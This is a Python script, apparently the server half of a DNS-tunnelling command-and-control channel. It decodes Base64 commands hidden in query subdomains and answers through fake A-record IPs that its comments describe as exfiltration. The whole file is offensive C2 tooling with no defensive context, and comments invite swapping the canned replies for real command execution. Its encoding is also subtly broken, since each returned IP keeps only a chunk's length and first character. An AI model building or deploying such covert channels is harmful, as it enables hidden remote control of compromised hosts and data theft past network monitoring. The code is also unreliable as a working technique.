import socket
import base64
from dnslib import DNSRecord, RR, A

# DNS server configuration
IP = "0.0.0.0"  # Listen on all interfaces
PORT = 533       # Custom DNS port (match client)

# Predefined responses (or execute real commands)
commands = {
    "whoami": "user123",
    "ls": "file1.txt\nfile2.log",
    "exit": "Terminating C2"
}

def handle_request(data, addr, sock):
    try:
        dns_record = DNSRecord.parse(data)
        qname = str(dns_record.q.qname)
        
        # Extract the Base64-encoded command (first subdomain)
        encoded_cmd = qname.split('.')[0]
        
        # Decode the command (e.g., "d2hvYW1p" -> "whoami")
        try:
            decoded_cmd = base64.b64decode(encoded_cmd).decode('utf-8')
        except:
            decoded_cmd = encoded_cmd  # Fallback if not Base64

        print(f"[+] Received query from {addr[0]}: {qname}")
        print(f"[+] Decoded command: {decoded_cmd}")

        # Get the response (from predefined dict or execute dynamically)
        response = commands.get(decoded_cmd, "Command not found")

        # Encode the response in Base64 for exfiltration
        encoded_response = base64.b64encode(response.encode()).decode('utf-8')
        print(f"[+] Sending response: {encoded_response}")

        # Craft a DNS reply with the encoded response
        reply = dns_record.reply()
        
        # Option 1: Send response as fake IP (e.g., 1.2.3.4 -> "1-2-3-4")
        # reply.add_answer(RR(qname, rdata=A("127.0.0.1")))  # Dummy IP
        
        # Option 2: Split response into subdomains (for multi-packet exfil)
        response_parts = [encoded_response[i:i+4] for i in range(0, len(encoded_response), 4)]
        for part in response_parts[:3]:  # Limit to 3 parts for simplicity
            reply.add_answer(RR(qname, rdata=A(f"127.0.{len(part)}.{ord(part[0])}")))  # Encoded in IP

        sock.sendto(reply.pack(), addr)

    except Exception as e:
        print(f"[-] Error handling request: {e}")

def start_dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((IP, PORT))
    print(f"[*] DNS server running on {IP}:{PORT}")

    while True:
        data, addr = sock.recvfrom(512)  # Max DNS UDP size
        handle_request(data, addr, sock)

if __name__ == "__main__":
    start_dns_server()